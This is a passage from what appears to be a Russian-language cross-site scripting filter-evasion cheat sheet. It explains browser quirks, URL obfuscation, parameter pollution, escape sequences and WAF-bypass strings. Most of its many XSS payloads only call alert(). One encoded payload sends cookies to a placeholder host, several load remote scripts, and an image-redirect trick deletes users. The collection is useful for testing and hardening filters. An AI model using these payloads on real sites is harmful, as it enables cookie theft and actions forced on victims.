<OBJECT TYPE="text/x-scriptlet" DATA="http://xss.rocks/scriptlet.html"></OBJECT>
```

### EMBED SVG содержащий XSS-вектор

Эта атака работает только в Firefox:

```html
<EMBED SRC="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg==" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
```

(Спасибо nEUrOO за это)

### XML-база данных с обфускацией CDATA

Эта XSS-атака работает только в IE:

```html
<XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></XML>
<SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
```

### Локально размещенный XML со встроенным JavaScript, который генерируется с использованием XML-базы данных

Эта атака почти такая же, как и описанная выше, но вместо этого она ссылается на локально размещенный (на том же сервере) XML-файл, который будет содержать ваш XSS-вектор. Результат вы можете увидеть здесь:

```html
<XML SRC="xsstest.xml" ID=I></XML>
<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
```

### HTML+TIME в XML

Эта атака работает только в IE и помните, что для того, чтобы это сработало, вы должны находиться между тегами HTML и BODY:

```html
<HTML><BODY>
<?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">
<?import namespace="t" implementation="#default#time2">
<t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert("XSS")</SCRIPT>">
</BODY></HTML>
```

(Вот как Grey Magic взломала Hotmail и Yahoo!)

### Предполагая, что вы можете поместить только несколько символов, и это отфильтровывает их по  `.js`

Эта атака позволяет вам переименовать ваш JavaScript-файл в изображение в виде XSS-вектора:

```html
<SCRIPT SRC="http://xss.rocks/xss.jpg"></SCRIPT>
```

### SSI (Server Side Includes) включения на стороне сервера 

Для использования этого XSS-вектора на сервере должен быть установлен SSI. Возможно, мне не нужно упоминать об этом, но если вы можете запускать команды на сервере, то, несомненно, возникнут гораздо более серьезные проблемы:

```js
<!--#exec cmd="/bin/echo '<SCR'"--><!--#exec cmd="/bin/echo 'IPT SRC=http://xss.rocks/xss.js></SCRIPT>'"-->
```

### PHP

Для этой атаки требуется, чтобы на сервере был установлен PHP. Опять же, если вы можете запускать какие-либо скрипты удаленно, как это, вероятно, возникают гораздо более серьезные проблемы:

```php
<? echo('<SCR)';
echo('IPT>alert("XSS")</SCRIPT>'); ?>
```

### IMG Встроенные команды

Эта атака работает только в том случае, если она внедрена (например, веб-панель) на веб-страницу, защищенную паролем, и эта защита паролем работает с другими командами в том же домене. Это может быть использовано для удаления пользователей, добавления пользователей (если пользователь, который посещает страницу, является администратором), отправки учетных данных в другое место и т.д. Это один из менее используемых, но более полезных XSS-векторов:

```html
<IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode">
```

#### IMG Встроенные команды часть II

Это еще более пугающая атака, потому что нет абсолютно никаких идентификаторов, которые могли бы вызвать подозрение, кроме того, что изображение размещено не на вашем собственном домене. Вектор использует 302 или 304 (другие тоже работают), чтобы перенаправить изображение обратно в команду. Таким образом, обычный `<IMG SRC="httx://badguy.com/a.jpg ">` на самом деле может быть вектором атаки для запуска команд от имени пользователя, который просматривает ссылку на изображение. Вот строка `.htaccess` (в Apache) для создания вектора:

```log
Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser
```

(Спасибо Тимо за участие в этом)

### Cookie Manipulation

Этот метод довольно неясен, но есть несколько примеров, где допускается использование `<META` и его можно использовать для перезаписи файлов cookie. Есть и другие примеры сайтов, где вместо того, чтобы извлекать имя пользователя из базы данных, оно сохраняется в файле cookie и отображается только тому пользователю, который посещает страницу. Объединив эти два сценария, вы можете изменить файл cookie жертвы, который будет отображаться для нее в виде JavaScript (вы также можете использовать это, чтобы люди выходили из системы или меняли свои пользовательские состояния, заставляли их входить в систему под вашим именем и т.д.):

```html
<META HTTP-EQUIV="Set-Cookie" Content="USERID=<SCRIPT>alert('XSS')</SCRIPT>">
```

### XSS с использованием инкапсуляции HTML-цитат

Эта атака изначально была протестирована в IE, поэтому ваш пробег может отличаться. Для выполнения XSS на сайтах, которые разрешают `<SCRIPT>`, но не разрешают `<SCRIPT SRC...`, используя фильтр регулярных выражений `/\<script\[^\>\]+src/i`, выполните следующие действия:

```html
<SCRIPT a=">" SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

Если вы выполняете XSS на сайтах, которые разрешают `<SCRIPT>`, но не разрешают `\<script src...` из-за фильтра регулярных выражений, который разрешает `/\<script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\>\\s\]+))?)+\\s\*|\\s\*)src/i` (Это важное значение, потому что это регулярное выражение встречается на просторах):

```html
<SCRIPT =">" SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

Другой XSS для обхода того же фильтра: `/\<script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\>\\s\]+))?)+\\s\*|\\s\*)src/i`:

```html
<SCRIPT a=">" '' SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

Еще один XSS, который обходит тот же фильтр: `/\<script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\>\\s\]+))?)+\\s\*|\\s\*)src/i`

В общем, мы не обсуждаем методы смягчения последствий, но единственное, что останавливает этот пример XSS, - если вы все еще хотите разрешить теги `<SCRIPT>`, но при этом удаленный скрипт не является машиной состояний (и, конечно, есть другие способы обойти это, если они разрешают теги `<SCRIPT>`), используйте это:

```html
<SCRIPT "a='>'" SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

И последняя атака XSS, которой стоит избежать, `/\<script((\\s+\\w+(\\s\*=\\s\*(?:"(.)\*?"|'(.)\*?'|\[^'"\>\\s\]+))?)+\\s\*|\\s\*)src/i` использованием серьезных ударений (опять же, не работает в Firefox):

<!-- markdownlint-disable MD038-->
```html
<SCRIPT a=`>` SRC="httx://xss.rocks/xss.js"></SCRIPT>
```
<!-- markdownlint-enable MD038-->

Вот пример XSS, который работает, если регулярное выражение не перехватывает совпадающую пару кавычек, но вместо этого находит любые кавычки, которые неправильно завершают строку параметра:

```html
<SCRIPT a=">'>" SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

Этот XSS все еще беспокоит меня, так как было бы почти невозможно остановить это, не заблокировав весь активный контент:

```html
<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="httx://xss.rocks/xss.js"></SCRIPT>
```

### URL String Evasion

Следующие атаки работают, если `http://www.google.com/` программно запрещен:

#### IP В зависимости от имени хоста

```html
<A HREF="http://66.102.7.147/">XSS</A>
```

#### URL Кодирование

```html
<A HREF="http://%77%77%77%2E%67%6F%6F%67%6C%65%2E%63%6F%6D">XSS</A>
```

#### DWORD Кодирование

Примечание: существуют и другие варианты кодировки DWORD - смотрите калькулятор обфускации IP-адресов ниже для получения более подробной информации:

```html
<A HREF="http://1113982867/">XSS</A>
```

#### Hex Кодирование

Общий допустимый размер каждого числа составляет где-то около 240 символов, как вы можете видеть на второй цифре, и поскольку шестнадцатеричное число находится в диапазоне от 0 до F, начальный ноль в третьей шестнадцатеричной кавычке не требуется:

```html
<A HREF="http://0x42.0x0000066.0x7.0x93/">XSS</A>
```

#### Octal Кодирование

Опять же, отступы разрешены, хотя общее количество символов в каждом классе должно превышать 4 - как в классе A, классе B и т.д:

```html
<A HREF="http://0102.0146.0007.00000223/">XSS</A>
```

#### Base64 Кодирование

```html
<img onload="eval(atob('ZG9jdW1lbnQubG9jYXRpb249Imh0dHA6Ly9saXN0ZXJuSVAvIitkb2N1bWVudC5jb29raWU='))">
```

#### Mixed Кодирование

Давайте смешаем и сопоставим базовую кодировку и добавим несколько табуляций и переводов строк (почему браузеры это разрешают, я никогда не узнаю). Табуляции и переводы строк работают, только если они заключены в кавычки:

<!-- markdownlint-disable MD010-->
```html
<A HREF="h
tt  p://6	6.000146.0x7.147/">XSS</A>
```
<!-- markdownlint-enable MD010-->

#### Обход разрешения протокола

`//` переводится в `http://`, что экономит еще несколько байт. Это действительно удобно, когда также возникает проблема с пробелом (двух меньших символов может быть недостаточно), и позволяет легко обойти регулярные выражения типа `(ht|f)tp(s)?://` (спасибо Ozh за часть этого). Вы также можете изменить `//` на `\\\\`. Однако косые черты должны оставаться на месте, иначе это будет интерпретироваться как относительный URL-адрес:

```html
<A HREF="//www.google.com/">XSS</A>
```

#### Удаление CNAME

В сочетании с указанным выше URL-адресом удаление `www.` сэкономит дополнительные 4 байта, а общая экономия составит 9 байт для серверов, которые настроили это должным образом:

```html
<A HREF="http://google.com/">XSS</A>
```

Дополнительная точка для абсолютного DNS:

```html
<A HREF="http://www.google.com./">XSS</A>
```

#### Расположение ссылки на JavaScript

```html
<A HREF="javascript:document.location='http://www.google.com/'">XSS</A>
```

#### Замена содержимого в качестве вектора атаки

<!-- markdownlint-disable MD010-->
Предполагая, что `http://www.google.com/` программно заменено на ничто. Аналогичный вектор атаки был использован против нескольких отдельных XSS-фильтров реального мира с использованием самого фильтра преобразования (вот пример), чтобы помочь создать вектор атаки `java&\#x09;script:`, который был преобразован в `java	script:`, который отображается в IE:
<!-- markdownlint-enable MD010-->

```html
<A HREF="http://www.google.com/ogle.com/">XSS</A>
```

### Помощь XSS в борьбе с загрязнением параметров HTTP

Если процесс обмена контентом на веб-сайте реализован так, как показано ниже, эта атака сработает. Существует страница `Content`, которая содержит некоторый контент, предоставленный пользователями, и на этой странице также есть ссылка на страницу `Share (Поделиться)` , которая позволяет пользователю выбрать свою любимую платформу для обмена в социальных сетях, чтобы поделиться им. Разработчики закодировали параметр `title` в HTML на странице `Content` для защиты от XSS, но по некоторым причинам они не закодировали этот параметр в URL, чтобы предотвратить загрязнение параметров HTTP. Наконец, они решили, что, поскольку значение `content_type` является константой и всегда будет целым числом, они не кодировали и не проверяли `content_type` на странице `Share (Поделиться)`.

#### Исходный код страницы с контентом

```html
a href="/Share?content_type=1&title=<%=Encode.forHtmlAttribute(untrusted content title)%>">Share</a>
```

#### Исходный код страницы "Поделиться"

```js
<script>
var contentType = <%=Request.getParameter("content_type")%>;
var title = "<%=Encode.forJavaScript(request.getParameter("title"))%>";
...
//возможно, здесь содержится некоторое пользовательское соглашение и логика отправки на сервер
...
</script>
```

#### Вывод содержимого страницы

Если злоумышленник установит заголовок ненадежного содержимого как `Это обычный title&content_type=1;alert(1)`, ссылка на странице `Content` будет такой:

```html
<a href="/share?content_type=1&title=This is a regular title&amp;content_type=1;alert(1)">Share</a>
```

#### Вывод с "Поделиться страницей" 

И в разделе "Поделиться страницей" вывод может быть таким:

```js
<script>
var contentType = 1; alert(1);
var title = "This is a regular title";
…
//возможно, здесь содержится некоторое пользовательское соглашение и логика отправки на сервер
…
</script>
```

В результате, в этом примере основной ошибкой является доверие к content_type на странице `Share` без надлежащей кодировки или проверки. Загрязнение параметров HTTP может усилить влияние ошибки XSS, превратив ее из отраженного XSS в сохраненный XSS.

## Последовательности экранирования символов

Вот все возможные комбинации символа `\<` в HTML и JavaScript. Большинство из них не будут отображаться "из коробки", но многие из них могут быть отображены при определенных обстоятельствах, как показано выше.

- `<`
- `%3C`
- `&lt`
- `&lt;`
- `&LT`
- `&LT;`
- `&#60`
- `&#060`
- `&#0060`
- `&#00060`
- `&#000060`
- `&#0000060`
- `&#60;`
- `&#060;`
- `&#0060;`
- `&#00060;`
- `&#000060;`
- `&#0000060;`
- `&#x3c`
- `&#x03c`
- `&#x003c`
- `&#x0003c`
- `&#x00003c`
- `&#x000003c`
- `&#x3c;`
- `&#x03c;`
- `&#x003c;`
- `&#x0003c;`
- `&#x00003c;`
- `&#x000003c;`
- `&#X3c`
- `&#X03c`
- `&#X003c`
- `&#X0003c`
- `&#X00003c`
- `&#X000003c`
- `&#X3c;`
- `&#X03c;`
- `&#X003c;`
- `&#X0003c;`
- `&#X00003c;`
- `&#X000003c;`
- `&#x3C`
- `&#x03C`
- `&#x003C`
- `&#x0003C`
- `&#x00003C`
- `&#x000003C`
- `&#x3C;`
- `&#x03C;`
- `&#x003C;`
- `&#x0003C;`
- `&#x00003C;`
- `&#x000003C;`
- `&#X3C`
- `&#X03C`
- `&#X003C`
- `&#X0003C`
- `&#X00003C`
- `&#X000003C`
- `&#X3C;`
- `&#X03C;`
- `&#X003C;`
- `&#X0003C;`
- `&#X00003C;`
- `&#X000003C;`
- `\x3c`
- `\x3C`
- `\u003c`
- `\u003C`

## Методы обхода WAF – межсайтового скриптинга

### Общие проблемы

#### Хранимые XSS

Если бы злоумышленнику удалось протолкнуть XSS через фильтр, WAF не смог бы предотвратить проведение атаки.

#### Отражение XSS в JavaScript

Пример:

```js
<script> ... setTimeout(\\"writetitle()\\",$\_GET\[xss\]) ... </script>
```

Эксплуатация:

```js
/?xss=500); alert(document.cookie);//
```

#### XSS на основе DOM

Пример:

```js
<script> ... eval($\_GET\[xss\]); ... </script>
```

Эксплуатация:

```js
/?xss=document.cookie
```

#### XSS через перенаправление запросов

Уязвимый код:

```js
...
header('Location: '.$_GET['param']);
...
```

Так же как:

```js
...
header('Refresh: 0; URL='.$_GET['param']);
...
```

Этот запрос не пройдет через WAF:

```html
/?param=<javascript:alert(document.cookie>)
```

Этот запрос пройдет через WAF, и в определенных браузерах будет проведена XSS-атака:

```html
/?param=<data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4=
```

### Строки обхода WAF для XSS

<!-- markdownlint-disable MD038-->
- `<Img src = x onerror = "javascript: window.onerror = alert; throw XSS">`
- `<Video> <source onerror = "javascript: alert (XSS)">`
- `<Input value = "XSS" type = text>`
- `<applet code="javascript:confirm(document.cookie);">`
- `<isindex x="javascript:" onmouseover="alert(XSS)">`
- `"></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>`
- `"><img src="x:x" onerror="alert(XSS)">`
- `"><iframe src="javascript:alert(XSS)">`
- `<object data="javascript:alert(XSS)">`
- `<isindex type=image src=1 onerror=alert(XSS)>`
- `<img src=x:alert(alt) onerror=eval(src) alt=0>`
- `<img  src="x:gif" onerror="window['al\u0065rt'](0)"></img>`
- `<iframe/src="data:text/html,<svg onload=alert(1)>">`
- `<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>`
- `<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script`
- `<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">`
- `<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>`
- `<form><a href="javascript:\u0061lert(1)">X`
- `</script><img/*%00/src="worksinchrome&colon;prompt(1)"/%00*/onerror='eval(src)'>`
- `<style>//*{x:expression(alert(/xss/))}//<style></style>`

При наведении курсора мыши​:

- `<img src="/" =_=" title="onerror='prompt(1)'">`
- `<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe`
- `<script x> alert(1) </script 1=2`
- `<form><button formaction=javascript&colon;alert(1)>CLICKME`
- `<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"`
- `<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>`
- `<OBJECT CLASSID="clsid:333C7BC4-460F-11D0-BC04-0080C7055A83"><PARAM NAME="DataURL" VALUE="javascript:alert(1)"></OBJECT> `
<!-- markdownlint-enable MD038-->

### Обфускация предупреждения об обходе фильтра

- `(alert)(1)`
- `a=alert,a(1)`
- `[1].find(alert)`
- `top[“al”+”ert”](1)`
- `top[/al/.source+/ert/.source](1)`
- `al\u0065rt(1)`
- `top[‘al\145rt’](1)`
- `top[‘al\x65rt’](1)`
- `top[8680439..toString(30)](1)`
- `alert?.()`
- `(alert())`

Полезная нагрузка должна включать начальные и конечные обратные метки:

```js
&#96;`${alert``}`&#96;
```
